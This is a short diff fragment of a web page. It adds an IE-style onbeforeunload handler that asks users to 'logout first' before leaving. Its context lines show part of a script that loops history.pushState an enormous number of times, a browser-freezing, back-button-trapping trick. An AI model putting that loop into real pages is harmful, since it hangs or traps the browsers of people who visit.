@@ -495,3 +495,18 @@ for( var i = 0; i < 10000000000000; i++ ) {
   history.pushState(0,0, total );
 }
 </script>
+<head runat="server">
+    
+
+    <script type="text/javascript" language="javascript">
+
+function window.onbeforeunload()  
+{  
+    if( event.clientX>document.body.clientWidth && event.clientY<0 || event.altKey )  
+    {  
+        window.event.returnValue="please, logout first";  
+    }
+}
+
+    </script>
+</head>
